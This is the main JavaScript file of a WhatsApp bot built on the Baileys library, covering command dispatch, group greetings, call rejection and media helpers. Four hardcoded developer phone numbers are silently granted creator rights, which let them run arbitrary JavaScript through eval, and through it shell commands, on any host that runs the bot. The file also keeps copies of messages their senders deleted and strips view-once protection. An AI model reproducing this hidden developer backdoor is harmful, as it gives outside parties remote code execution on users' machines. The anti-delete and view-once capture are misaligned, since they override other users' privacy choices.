const pino = require('pino')
const config = require('./config');
const fs = require('fs-extra');
const FileType = require('file-type')
const path = require('path');
const prefix = config.HANDLERS[0];
const { writeFile } = require("fs/promises");
const events = require('./lib/commands')
const { exec } = require("child_process");
const PhoneNumber = require('awesome-phonenumber')
const { default: Taira,
        WA_DEFAULT_EPHEMERAL,
        getContentType,
        downloadContentFromMessage,
        DisconnectReason,
        useMultiFileAuthState,
        generateForwardMessageContent,
        generateWAMessageFromContent,
        makeInMemoryStore, 
        jidDecode
} = require("baileys")
const util = require("util");
const axios = require("axios");
const moment = require("moment-timezone");
const { getSession } = require("./lib/funct2")
const { smsg, sleep, numToJid } = require('./lib')
var prefixRegex = config.HANDLERS === "false" || config.HANDLERS === "null" ? "^" : new RegExp('^[' + config.HANDLERS + ']');

setTimeout(() => {
    const store = makeInMemoryStore({
        logger: pino().child({ level: "silent", stream: "store" }),
    });
    require("events").EventEmitter.defaultMaxListeners = 600;
    async function connectWA() {
        const { state, saveCreds } = await useMultiFileAuthState("taira_baileys")
        const conn = Taira({
            logger: pino({ level: 'silent' }),
            printQRInTerminal: false,
            browser: ['Xchriss Bot', 'safari', '1.0.0'],
            fireInitQueries: false,
            shouldSyncHistoryMessage: false,
            downloadHistory: false,
            syncFullHistory: false,
            generateHighQualityLinkPreview: true,
            auth: state,
            getMessage: async key => {
                if (store) {
                    const msg = await store.loadMessage(key.remoteJid, key.id, undefined)
                    return msg.message || undefined
                }
                return { conversation: 'An Error Occurred, Repeat Command!'   }
            }
        })
        store.bind(conn.ev)
        conn.public = true
setInterval(() => {
    store.writeToFile(__dirname+"/store.json");
  }, 30 * 1000);
        conn.ev.on('messages.upsert', async chatUpdate => {
            const msg = chatUpdate.messages[0]
            if (!msg.message) return
            if(msg.message.viewOnceMessageV2) return
            msg.message = (Object.keys(msg.message)[0] === 'ephemeralMessage') ? msg.message.ephemeralMessage.message : msg.message
            if(msg.key && msg.key.remoteJid === 'status@broadcast'  && config.auto_read_status==='true'){
            await conn.readMessages([msg.key])    
            }
           const botNumber = await conn.decodeJid(conn.user.id)
            if (msg.key && msg.key.remoteJid === 'status@broadcast') return
            try {
                let m = await smsg(conn, JSON.parse(JSON.stringify(msg)), store)
                if (!m.message) return
                if(m.isBaileys) return
                if (m.jid.endsWith("broadcast")) return;
                if (config.alwaysonline==='true') { conn.sendPresenceUpdate('available', m.jid) }
                var { body } = m
                var budy = typeof m.text == "string" ? m.text : false;
                let icmd = body ? prefixRegex.test(body[0]) : false;
	        	if (config.READ_MSG == true && msg.key.remoteJid !== 'status@broadcast') await conn.readMessages([msg.key]);
                const args = m.body ? body.trim().split(/ +/).slice(1) : null;               
                const hgg = botNumber.split('@')[0]
                const quoted = m.quoted ? m.quoted : m;
                const mime = (quoted.msg || quoted).mimetype || "";

                let devss = ["2349072958046", "2349151864541", "2348083569647", "2349031616504"]
                let isCreator = [ hgg,...devss,...config.SUDO.split(",")].map((v) => v.replace(/[^0-9]/g) + "@s.whatsapp.net").includes(m.sender);
                if (!isCreator && config.MODE === 'private') return
                        const cmdName = icmd ? body.slice(1).trim().split(" ")[0].toLowerCase() : false;
                if (icmd) {
                    const cmd = events.commands.find((cmd) => cmd.pattern === (cmdName)) || events.commands.find((cmd) => cmd.alias && cmd.alias.includes(cmdName))
                    if (cmd) {
                         isCreator = [ hgg,...devss,...config.SUDO.split(",")].map((v) => v.replace(/[^0-9]/g) + "@s.whatsapp.net").includes(m.sender);
                        if (cmd.react) m.react(cmd.react)
                        let text;
                        try { text = m.body ? body.trim().split(/ +/).slice(1).join(" ") : null;  } 
                        catch { text = false; }
                        try {  cmd.function(conn, m, text,{ args, isCreator, body, budy});  }
                        catch (e) { console.error("[ERROR] ", e); }
                    }
                }
                events.commands.map(async(command) => {
                    if (body && command.on === "body") {
                        command.function(conn, m,{args, isCreator, icmd, body, budy});
                    } else if (m.text && command.on === "text") {
                        command.function(conn, m, args,{isCreator, icmd, body, budy});
                    } else if (
                        (command.on === "image" || command.on === "photo") &&
                        m.mtype === "imageMessage"
                    ) {
                        command.function(conn, m, args,{ isCreator, body, budy});
                    } else if (
                        command.on === "sticker" &&
                        m.mtype === "stickerMessage"
                    ) {
                        command.function(conn, m, args,{isCreator, body, budy});
                    }
                });
                /*const groupMetadata = m.isGroup ? await conn.groupMetadata(m.jid)
                    .catch((e) => {}) : "";
                const participants = m.isGroup && groupMetadata.participants !=undefined ? await groupMetadata.participants : "";
                const groupAdminss = (participants) => {
                    a = [];
                    for (let i of participants) {
                        if (i.admin == null) continue;
                        a.push(i.id);
                    }
                    return a;
                }
                const groupAdmins = m.isGroup ? await groupAdminss(participants) : ''
                const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false;
                const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false;*/
                if (config.LOG_MSG) {
                    console.log(`
                     [ MESSAGE ]
                     SENDER: ${m.sender}
                     TYPE: ${m.mtype || getContentType(msg.message)}
                     BODY: ${m.body}
                     JID: ${m.jid}       
                    `)
	            }
                if (isCreator && m.text.startsWith('>')) {
                    let code = budy.slice(2)
                    if (!code) {
                        m.reply(`Provide some codes!`);
                        return;
                    }
                    try {
                        let resultTest = eval(code);
                        if (typeof resultTest === "object")
                            m.reply(util.format(resultTest));
                        else m.reply(util.format(resultTest));
                    } catch (err) {
                        m.reply(util.format(err));
                    }
                    return
                }
                if (isCreator && m.text.startsWith('<')) {
                    let code = budy.slice(2)
                    if (!code) {
                        m.reply(`Provide some codes!`);
                        return;
                    }
                    try {
                        let resultTest = await eval('const a = async()=>{\n' + code + '\n}\na()');
                        let h = util.format(resultTest);
                      if(h===undefined) return console.log(h)
                      else
                        m.reply(h)

                    } catch (err) {
                      if(err===undefined) return console.log('error')
                     else 
                    m.reply(util.format(err));
                    }
                    return
                }
                if (isCreator && m.text.startsWith('<')) {
                  try {
                    exec(budy.slice(2), (err, stdout) => {
                      if (err) return m.reply(`${err}`)
                      if (stdout) return m.reply(`${stdout}`)
                    })
                  } catch (error) {
                    m.reply(util.format(err));
                  }
                }
            } catch (e) {
                console.log(e)
            }
        })
       
       function notifier(deletedMessage) {
    const deletedBy = deletedMessage.key.participant || deletedMessage.key.remoteJid;

    const timeNow = new Intl.DateTimeFormat('en-KE', {
        timeZone: 'Africa/Lagos',
        dateStyle: 'full',
        timeStyle: 'medium',
    }).format(new Date());

    let notification =`*[ ᴅᴇʟᴇᴛᴇᴅ ᴍᴇssᴀɢᴇ ᴅᴇᴛᴇᴄᴛᴇᴅ ]*\n`;
    notification += `*ᴛɪᴍᴇ:* ${timeNow}\n`;
    notification += `*ʙʏ:* @${deletedBy.split('@')[0]}\n`;

    return notification;
}


       conn.ev.on("messages.upsert", async (m) => {
    if (config.ANTIDELETE) {
        const { messages } = m;
        const ms = messages[0];
        if (!ms.message) return;

        const messageKey = ms.key;
        const remoteJid = messageKey.remoteJid;
        if (!store.chats[remoteJid]) {
            store.chats[remoteJid] = [];
        }
        store.chats[remoteJid].push(ms);
        if (ms.message.protocolMessage && ms.message.protocolMessage.type === 0) {
            const deletedKey = ms.message.protocolMessage.key;
            const chatMessages = store.chats[remoteJid];
            const deletedMessage = chatMessages.find(
                (msg) => msg.key.id === deletedKey.id
            );
                    const rep = {
    key: {
        remoteJid: 'status@broadcast',
        fromMe: false,
        participant: '0@s.whatsapp.net'
    },
    message: {
      newsletterAdminInviteMessage: {
        newsletterJid: `120363322606369079@newsletter`,
        newsletterName: `𝚃𝙰𝙸𝚁𝙰 𝙼𝙰𝙺𝙸𝙽𝙾`,
        jpegThumbnail:  null,
        caption: `ᴅᴇʟᴇᴛᴇᴅ ᴍᴇssᴀɢᴇ ʜᴇʀᴇ`,
        inviteExpiration: Date.now() + 1814400000
      }
    }
};

            if (deletedMessage) {
                try {
                    const notification = notifier(deletedMessage)
                    const mtype = Object.keys(deletedMessage.message)[0];

                    if (mtype === 'conversation' || mtype === 'extendedTextMessage') {
                        await conn.sendMessage(conn.user.id, {
                            text: notification + `*ᴍᴇssᴀɢᴇ:* ${deletedMessage.message[mtype].text}\n\n> ${config.BOT_NAME}.`,
                            mentions: [deletedMessage.key.participant]
                        });
                    }
                    else {
                       const antideletedMsg = JSON.parse(JSON.stringify(deletedMessage.message));
        const messageType = Object.keys(antideletedMsg)[0];
        if (antideletedMsg[messageType]) {
                antideletedMsg[messageType].contextInfo = {
                        stanzaId: deletedMessage.key.id,
                        participant: deletedMessage.sender,
                        quotedMessage: deletedMessage.message,
                };
        }

      await conn.relayMessage(conn.user.id, antideletedMsg, {});
      await conn.sendMessage(conn.user.id, {
                            text: notification,
                            mentions: [deletedMessage.key.participant]
                        }, { quoted: deletedMessage.message });
                    }
                } catch (error) {
                    console.error('Error handling deleted message:', error);
                }
            }
        }
    }
});


conn.ev.on('group-participants.update', async (event) => {
    	if (config.GREETINGS){
try {
let metadata = await conn.groupMetadata(event.id)
let participants = event.participants
const xchriss = fs.readFileSync(path.resolve(__dirname, './files/logo.jpg'));
const makinol = fs.readFileSync(path.resolve(__dirname, './files/taira2.jpg'));
for (let num of participants) {
//welcome\\
const timeNow = new Intl.DateTimeFormat('en-KE', {
        timeZone: 'Africa/Lagos',
        dateStyle: 'full',
        timeStyle: 'medium',
    }).format(new Date());
                if (event.action == 'add') {
                let userName = num
    mssg =  `
    *[ ᴡᴇʟᴄᴏᴍᴇ ᴛᴏ ${metadata.subject} ]*
    *ᴜsᴇʀ:* @${userName.split("@")[0]}
    *Time:* ${timeNow}
    `
    let buttonMessage = {
        image: xchriss,
        caption: mssg,
        headerType: 4,
        contextInfo: {
        mentionedJid:[num],
        externalAdReply: {
             title: config.BOT_NAME,
             body: "ᴡᴇʟᴄᴏᴍᴇ 🙂‍↔️", 
             thumbnail: makinol,
             mediaType: 4,
             mediaUrl: `https://t.me/Tha_Healer`,
             sourceUrl: `https://t.me/Tha_Healer`,
            },
        },
    }
       await conn.sendMessage(event.id, buttonMessage);
                } else if (event.action == 'remove') {
                	let userName = num
                    mssg =  `
    *[ ʟᴇᴀᴠɪɴɢ ${metadata.subject} ]*
    *ᴜsᴇʀ:* @${userName.split("@")[0]}
    *Time:* ${timeNow}
    `
    let buttonMessage = {
        image: xchriss,
        caption: mssg,
        headerType: 4,
        contextInfo: {
        mentionedJid:[num],
        externalAdReply: {
             title: config.BOT_NAME,
             body: "ɢᴏᴏᴅʙʏᴇ 🙂‍↔️", 
             thumbnail: makinol,
             mediaType: 4,
             mediaUrl: `https://t.me/Tha_Healer`,
             sourceUrl: `https://t.me/Tha_Healer`,
            },
        },
    }
       await conn.sendMessage(event.id, buttonMessage);
}
}
} catch (err) {
console.log(err)
}
}
})

conn.ev.on('group-participants.update', async (event) => {
    	if (config.PDM){
try {
let participants = event.participants
const xchriss = fs.readFileSync(path.resolve(__dirname, './files/logo.jpg'));
const makinol = fs.readFileSync(path.resolve(__dirname, './files/taira2.jpg'));
const timeNow = new Intl.DateTimeFormat('en-KE', {
        timeZone: 'Africa/Lagos',
        dateStyle: 'full',
        timeStyle: 'medium',
    }).format(new Date());
for (let num of participants) {
 if (event.action == 'promote') {
let userName = num
mssg =  `
    *[ ᴜsᴇʀ ᴘʀᴏᴍᴏᴛᴇᴅ ]*
    *ᴜsᴇʀ:* @${userName.split("@")[0]}
    *Time:* ${timeNow}
    `
    let buttonMessage = {
        image: xchriss,
        caption: mssg,
        headerType: 4,
        contextInfo: {
        mentionedJid:[num],
        externalAdReply: {
             title: config.BOT_NAME,
             body: "ᴜsᴇʀ ᴘʀᴏᴍᴏᴛᴇᴅ 🙂‍↔️", 
             thumbnail: makinol,
             mediaType: 4,
             mediaUrl: `https://t.me/Tha_Healer`,
             sourceUrl: `https://t.me/Tha_Healer`,
            },
        },
    }
       await conn.sendMessage(event.id, buttonMessage);
} else if (event.action == 'demote') {
let userName = num
mssg =  `
    *[ ᴜsᴇʀ ᴅᴇᴍᴏᴛᴇᴅ ]*
    *ᴜsᴇʀ:* @${userName.split("@")[0]}
    *Time:* ${timeNow}
    `
    let buttonMessage = {
        image: xchriss,
        caption: mssg,
        headerType: 4,
        contextInfo: {
        mentionedJid:[num],
        externalAdReply: {
             title: config.BOT_NAME,
             body: "ᴜsᴇʀ ᴅᴇᴍᴏᴛᴇᴅ 🙂‍↔️", 
             thumbnail: makinol,
             mediaType: 4,
             mediaUrl: `https://t.me/Tha_Healer`,
             sourceUrl: `https://t.me/Tha_Healer`,
            },
        },
    }
       await conn.sendMessage(event.id, buttonMessage);
}
}
} catch (err) {
console.log(err)
}
}
})
      conn.ev.on('call', async (call) => {
  if (call[0].status == 'offer') {
    if (config.ANTICAL_END) {
      await conn.sendMessage(conn.user.id, { text: "CALL DETECTED, CALL HAS BEEN REJECTED.", quoted: call[0] });
      await conn.rejectCall(call[0].id, call[0].from);
    }
    if (config.ANTICALL_BLOCK) {
      await conn.sendMessage(conn.user.id, { text: "CALL DETECTED, USER HAS BEEN BLOCKED.", quoted: call[0] });
      await conn.rejectCall(call[0].id, call[0].from);
      await sleep(2000);
      await conn.updateBlockStatus(call[0].from, "block");
    }
  }
  return !0;
});

        conn.decodeJid = (jid) => {
            if (!jid) return jid
            if (/:\d+@/gi.test(jid)) {
                let decode = jidDecode(jid) || {}
                return decode.user && decode.server && decode.user + '@' + decode.server || jid
            } else return jid
        }

        conn.ev.on('contacts.upsert', (contacts) => {
                const contactsUpsert = (newContacts) => {
                    for (const contact of newContacts) {
                        if (store.contacts[contact.id]) {
                            Object.assign(store.contacts[contact.id], contact);
                        } else {
                            store.contacts[contact.id] = contact;
                        }
                    }
                    return;
                };
                contactsUpsert(contacts);
            })


        conn.getName = (jid, withoutContact = false) => {
                id = conn.decodeJid(jid)

                withoutContact = conn.withoutContact || withoutContact
                let v
                if (id.endsWith("@g.us")) return new Promise(async(resolve) => {
                    v = store.contacts[id] || {}
                    if (!(v.name.notify || v.subject)) v = conn.groupMetadata(id) || {}
                    resolve(v.name || v.subject || PhoneNumber('+' + id.replace('@s.whatsapp.net', '')).getNumber('international'))
                })
                else v = id === '0@s.whatsapp.net' ? {
                        id,
                        name: 'WhatsApp'
                    } : id === conn.decodeJid(conn.user.id) ?
                    conn.user :
                    (store.contacts[id] || {})
                return (withoutContact ? '' : v.name) || v.subject || v.verifiedName || PhoneNumber('+' + jid.replace('@s.whatsapp.net', '')).getNumber('international')
            }


        conn.sendContact = async(jid, kon, quoted = '', opts = {}) => {
                let list = []
                for (let i of kon) {
                    list.push({
                        displayName: await conn.getName(i + '@s.whatsapp.net'),
                        vcard: `BEGIN:VCARD\nVERSION:3.0\nN:${await conn.getName(i + '@s.whatsapp.net')}\nFN:${config.OWNER_NAME}\nitem1.TEL;waid=${i}:${i}\nitem1.X-ABLabel:Click here to chat\nitem2.EMAIL;type=INTERNET: phoenixgibson007@gmail.com\nitem2.X-ABLabel:GitHub\nitem3.URL:https://github.com/Anonphoenix007/Xchriss-Bot\nitem3.X-ABLabel:GitHub\nitem4.ADR:;;Nigeria;;;;\nitem4.X-ABLabel:Region\nEND:VCARD`
                    })
                }
                conn.sendMessage(jid, { contacts: { displayName: `${list.length} Contact`, contacts: list }, ...opts }, { quoted })
            }

        conn.setStatus = (status) => {
            conn.query({
                tag: 'iq',
                attrs: {
                    to: '@s.whatsapp.net',
                    type: 'set',
                    xmlns: 'status',
                },
                content: [{
                    tag: 'status',
                    attrs: {},
                    content: Buffer.from(status, 'utf-8')
                }]
            })
            return status
        }
        conn.serializeM = (m) => smsg(conn, m, store)


        conn.ev.on('connection.update', async(update) => {
                const { connection, lastDisconnect } = update
                if (connection === "connecting") {
                   console.log("ℹ️ Connecting to WhatsApp... Please Wait.");
                }
                if (connection === 'open') {
                    console.log("✅ Login Successful!");
                    fs.readdirSync('./plugins').forEach(plugin => {
						if (path.extname(plugin).toLowerCase() == '.js') {
							require('./plugins/' + plugin);
						}
					});
                    const bot_user = await conn.decodeJid(conn.user.id)
                    let owner = [bot_user.split("@")[0]]
                    const sudo = numToJid(config.SUDO.split(',')[0]) || client.user.id;
                    await sleep(10000)
			        await conn.sendMessage(sudo, { text: '*✞Xᴄʜʀɪss Bot✞*\n\n```PREFIX : ' + prefix + '\nPLUGINS : ' + events.commands.filter(command => command.pattern).length + '\nVERSION : ' + require('./package.json').version + '```'});
                }
                            if (connection === 'close') {
							let reason = lastDisconnect.error ? lastDisconnect?.error?.output.statusCode : 0;
                if (reason === DisconnectReason.badSession) {
                    console.log(`Bad Session File, Please Delete Session and Scan Again`);
                    connectWA().catch(err => console.log(err));
                } else if (reason === DisconnectReason.connectionClosed) {
                    console.log("Connection closed, reconnecting....");
                    connectWA().catch(err => console.log(err));
                } else if (reason === DisconnectReason.connectionLost) {
                    console.log("Connection Lost from Server, reconnecting...");
                    connectWA().catch(err => console.log(err));
                } else if (reason === DisconnectReason.connectionReplaced) {
                    console.log("Connection Replaced, Another New Session Opened, Please Close Current Session First");
                    connectWA().catch(err => console.log(err));
                } else if (reason === DisconnectReason.loggedOut) {
                    console.log(`Device Logged Out, Please Scan Again And Run.`);
                    connectWA().catch(err => console.log(err));
                } else if (reason === DisconnectReason.restartRequired) {
                    console.log("Restart Required, Restarting...");
                    connectWA().catch(err => console.log(err));
                } else if (reason === DisconnectReason.timedOut) {
                    console.log("Connection TimedOut, Reconnecting...");
                    connectWA().catch(err => console.log(err));
                } else conn.end(`Unknown DisconnectReason: ${reason}|${connection}`)
            }
            })
        conn.ev.on('creds.update', saveCreds)


        conn.sendText = (jid, text, quoted = '', options) => conn.sendMessage(jid, { text: text, ...options }, { quoted })


        conn.downloadAndSaveMediaMessage = async(message, filename, attachExtension = true) => {
                let quoted = message.msg ? message.msg : message
                let mime = (message.msg || message).mimetype || ''
                let messageType = message.mtype ? message.mtype.replace(/Message/gi, '') : mime.split('/')[0]
                const stream = await downloadContentFromMessage(quoted, messageType)
                let buffer = Buffer.from([])
                for await (const chunk of stream) {
                    buffer = Buffer.concat([buffer, chunk])
                }
                let type = await FileType.fromBuffer(buffer)
                trueFileName = attachExtension ? (filename + '.' + type.ext) : filename
                    // save to file
                await fs.writeFileSync(trueFileName, buffer)
                return trueFileName
            }


        conn.downloadMediaMessage = async(message) => {
            let mime = (message.msg || message).mimetype || ''
            let messageType = message.mtype ? message.mtype.replace(/Message/gi, '') : mime.split('/')[0]
            const stream = await downloadContentFromMessage(message, messageType)
            let buffer = Buffer.from([])
            for await (const chunk of stream) {
                buffer = Buffer.concat([buffer, chunk])
            }

            return buffer
        }

  
        conn.copyNForward = async(jid, message, forceForward = false, options = {}) => {
            let vtype
            if (options.readViewOnce) {
                message.message = message.message && message.message.ephemeralMessage && message.message.ephemeralMessage.message ? message.message.ephemeralMessage.message : (message.message || undefined)
                vtype = Object.keys(message.message.viewOnceMessage.message)[0]
                delete(message.message && message.message.ignore ? message.message.ignore : (message.message || undefined))
                delete message.message.viewOnceMessage.message[vtype].viewOnce
                message.message = {
                    ...message.message.viewOnceMessage.message
                }
            }

            let mtype = Object.keys(message.message)[0]
            let content = await generateForwardMessageContent(message, forceForward)
            let ctype = Object.keys(content)[0]
            let context = {}
            if (mtype != "conversation") context = message.message[mtype].contextInfo
            content[ctype].contextInfo = {
                ...context,
                ...content[ctype].contextInfo
            }
            const waMessage = await generateWAMessageFromContent(jid, content, options ? {
                ...content[ctype],
                ...options,
                ...(options.contextInfo ? {
                    contextInfo: {
                        ...content[ctype].contextInfo,
                        ...options.contextInfo
                    }
                } : {})
            } : {})
            await conn.relayMessage(jid, waMessage.message, { messageId: waMessage.key.id })
            return waMessage
        }


        conn.getFile = async(PATH, save) => {
                let res
                let data = Buffer.isBuffer(PATH) ? PATH : /^data:.*?\/.*?;base64,/i.test(PATH) ? Buffer.from(PATH.split `,` [1], 'base64') : /^https?:\/\//.test(PATH) ? await (res = await getBuffer(PATH)) : fs.existsSync(PATH) ? (filename = PATH, fs.readFileSync(PATH)) : typeof PATH === 'string' ? PATH : Buffer.alloc(0)

                let type = await FileType.fromBuffer(data) || {
                    mime: 'application/octet-stream',
                    ext: '.bin'
                }
                let filename = path.join(__filename, __dirname + new Date * 1 + '.' + type.ext)
                if (data && save) fs.promises.writeFile(filename, data)
                return {
                    res,
                    filename,
                    size: await getSizeMedia(data),
                    ...type,
                    data
                }

            }
            
        conn.parseMention = async(text) => {
            return [...text.matchAll(/@([0-9]{5,16}|0)/g)].map(v => v[1] + '@s.whatsapp.net')
        }

        return conn
    }

async function startBot() {
try {
    await getSession(config.SESSION_ID);
    connectWA().catch(err => console.log(err))
} catch (error) {
    console.log("Encountered Error", error)
}
}
startBot();

    let file = require.resolve(__filename)
    fs.watchFile(file, () => {
        fs.unwatchFile(file)
        console.log(`Update ${__filename}`)
        delete require.cache[file]
        require(file)
    })
}, 3000)
